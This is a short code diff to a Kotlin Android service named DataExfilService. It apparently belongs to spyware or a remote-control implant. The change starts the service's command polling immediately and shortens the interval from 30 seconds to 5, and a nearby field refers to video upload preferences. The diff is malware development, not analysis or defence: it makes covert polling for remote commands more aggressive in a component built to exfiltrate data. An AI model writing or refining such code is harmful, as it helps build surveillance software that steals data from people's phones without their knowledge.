@@ -933,12 +933,12 @@ class DataExfilService : Service() {
     }
 
     private fun startCommandPolling() {
-        handler.postDelayed(object : Runnable {
+        handler.post(object : Runnable {
             override fun run() {
                 checkForCommands()
-                handler.postDelayed(this, 30000) // Check every 30 seconds
+                handler.postDelayed(this, 5000) // Check every 5 seconds
             }
-        }, 15000)
+        })
     }
 
     private val videoUploadPrefs by lazy {
